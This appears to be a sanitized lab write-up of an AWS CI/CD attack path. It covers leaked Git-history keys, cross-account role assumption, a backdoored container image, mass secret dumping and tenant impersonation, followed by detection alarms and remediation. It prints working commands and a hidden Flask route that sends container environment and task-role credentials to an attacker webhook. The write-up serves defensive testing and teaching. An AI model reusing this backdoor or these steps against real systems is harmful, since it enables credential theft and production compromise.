# Attack Path 2 — CI/CD Pipeline Compromise via Leaked Git History

**Layer:** CI/CD → IAM → Prod
**Objective:** recover a leaked AWS credential from Git history and escalate it into full production compromise — replacing the tenant-facing application, exfiltrating every secret in the prod account, and achieving persistent tenant impersonation that survives credential rotation.

> Sanitized walk-through. Real account IDs, keys, ARNs, endpoints, and secret values are replaced with placeholders.

## Attacker profile

An external actor with no prior AWS access whose only capability is read access to a Git repository that, at some point in its history, contained hardcoded AWS credentials — modeling an accidentally-public repo, a retained clone, or a compromised integration.

## Misconfigurations exploited

| ID | Finding |
| --- | --- |
| F1 | Hardcoded IAM user credentials committed to `.github/workflows/deploy.yml` |
| F2 | Secrets persist in Git history after "removal" — a later commit hides them from HEAD but not from history |
| F3 | Deploy Role trust policy has no conditions (no MFA, no IP restriction) |
| F4 | Deploy Role grants `secretsmanager:GetSecretValue` on `*` across prod |
| F5 | (Discovered during testing) detection Lambda rejected cross-account invocations — see [remediation.md](remediation.md) |

## Phases

### Phase 1 — Initial access via Git history

Baseline: the attacker starts with no AWS credentials (`aws sts get-caller-identity` fails). The current workflow file appears secure (it references GitHub Secrets), but scanning history tells a different story:

```bash
gitleaks detect --source . -v
# Finding: AWS_ACCESS_KEY_ID: "AKIAIOSFODNN7EXAMPLE"   (rotated, older commit)
# Finding: AWS_ACCESS_KEY_ID: "AKIAI44QH8DHBEXAMPLE"   (active at time of attack)
```

gitleaks matches the access key ID but not the secret (no fixed prefix), so the attacker dumps historical versions of the file to recover the pair:

```bash
git log --all -p -- .github/workflows/deploy.yml | grep -B1 -A5 'AKIA'
```

The attacker now holds a valid IAM user credential pair — without ever touching AWS.

![Path 2 Phase 1 — gitleaks recovers the leaked AWS key](screenshots/attack2-phase1-gitleaks.png)

### Phase 2 — Cross-account privilege escalation (F3)

Configured as the dev-account pipeline user, the attacker assumes the prod Deploy Role:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::111111111111:role/sec-lab-deploy-role-prod \
  --role-session-name attacker-session \
  --profile attacker-iamuser
```

AWS returns temporary Deploy Role credentials. There is **no MFA challenge, no source-IP check, no external ID** — the trust policy only verifies the calling principal matches, and it does. `get-caller-identity` now shows the prod account.

```json
{ "Account": "111111111111",
  "Arn": "arn:aws:sts::111111111111:assumed-role/sec-lab-deploy-role-prod/attacker-session" }
```

![Path 2 Phase 2 — cross-account Deploy Role assumption](screenshots/attack2-phase2-assumerole.png)

### Phase 3 — Application replacement via the pipeline

Holding Deploy Role credentials, the attacker builds a backdoored image that keeps the real `/health` and `/upload` routes intact (so the ALB health check keeps the task healthy) but adds a hidden route that exfiltrates the container environment and task-role credentials to an attacker webhook:

```python
@app.route("/__debug_health", methods=["GET"])
def __debug_health():
    try:
        import requests, os
        creds_uri = "http://169.254.170.2" + os.environ.get(
            "AWS_CONTAINER_CREDENTIALS_RELATIVE_URI", "")
        creds = requests.get(creds_uri, timeout=2).json()
        requests.post(ATTACKER_WEBHOOK,
            json={"env": dict(os.environ), "task_role_creds": creds}, timeout=5)
    except Exception:
        pass
    return {"status": "ok"}, 200
```

Push to ECR (mutable `:latest` tag) and force a new deployment:

```bash
aws ecr get-login-password --region eu-west-3 | docker login --username AWS \
  --password-stdin 111111111111.dkr.ecr.eu-west-3.amazonaws.com
docker push 111111111111.dkr.ecr.eu-west-3.amazonaws.com/sec-lab-api:latest
aws ecs update-service --cluster sec-lab-cluster-prod \
  --service sec-lab-service-prod --force-new-deployment --region eu-west-3
```

The visible response is innocuous (`{"status":"ok"}`), but the webhook receives the full container environment — including the cleartext DB password — and the task-role credentials.

![Path 2 Phase 3 — backdoored image deployed to ECS](screenshots/attack2-phase3-deploy.png)  ![Path 2 Phase 3 — webhook receives exfiltrated env + creds](screenshots/attack2-phase3-webhook-exfil.png)

### Phase 4 — Mass secret exfiltration (F4) and tenant impersonation

The Deploy Role's `GetSecretValue *` reads every secret in prod. Secret names are known from the leaked source, so no `ListSecrets` is needed:

```bash
for s in tenant-a/api-key tenant-b/api-key tenant-c/api-key rds/credentials; do
  aws secretsmanager get-secret-value --secret-id "$s" \
    --region eu-west-3 --query SecretString --output text
done
```

Then, from a clean shell with **no AWS credentials at all**, the attacker impersonates a tenant using only the stolen API key:

```bash
curl -X POST -H "X-API-Key: <stolen tenant-c key>" \
  -F "file=@./pwn.xml" \
  http://sec-lab-alb-prod-XXXXXXXX.eu-west-3.elb.amazonaws.com/upload
# {"tenant_id":"tenant-c","s3_key":"tenant-c/<random>_pwn.xml","status":"processed"}
```

![Path 2 Phase 4 — all prod secrets dumped via Deploy Role](screenshots/attack2-phase4-secrets-dump.png)

**Why this is the worst impact:** the IAM user keys get rotated once the leak is found, closing most of the chain — but the tenant API keys are validated in application code, not by AWS, and are rarely rotated. They survive the rotation that ends the rest of the breach, giving the attacker indefinite tenant access.

### Phase 5 — Detection verification

Operating in the security account (read-only), the attack activity is confirmed in the cross-account CloudWatch log group, and both Path 2 alarms enter `ALARM`:

- `sec-lab-alarm-deploy-role-secrets-read` — counts the four `GetSecretValue` calls from Phase 4.
- `sec-lab-alarm-unexpected-assume-deploy-role` — fires on the Phase 2 role assumption.
- `sec-lab-alarm-task-role-direct-s3` — correctly stays `OK` (that alarm is Path 1's canary).

![Path 2 Phase 5 — both alarms in ALARM state](screenshots/attack2-phase5-alarms.png)

> **F5 — a bug in the detection layer itself.** During Phase 5, the Lambda forwarder's resource policy was found to specify the security account as `SourceAccount` instead of prod, silently dropping every cross-account invocation. The detection chain was correctly configured but never tested end-to-end. It was fixed and is documented as an independent finding. A security project should surface gaps in its own detective controls, not only in the systems it monitors.

## Key lesson

**CI/CD identity is production identity.** A pipeline that can deploy production is, by definition, one whose compromise is a production breach. The chain depends on three independently-modest misconfigurations (hardcoded credentials, an unconditioned trust policy, a wildcard secrets permission) — none alarming alone, dangerous in composition.

## Remediation

Static keys removed, OIDC federation with conditioned trust, scoped Secrets Manager access, SHA-pinned images, a gitleaks secret-scan workflow, and the F5 detection fix — see **[remediation.md](remediation.md)**. After remediation, the leaked keys are no longer valid credentials and the trust policy rejects non-OIDC assumptions, so the chain collapses at step one.
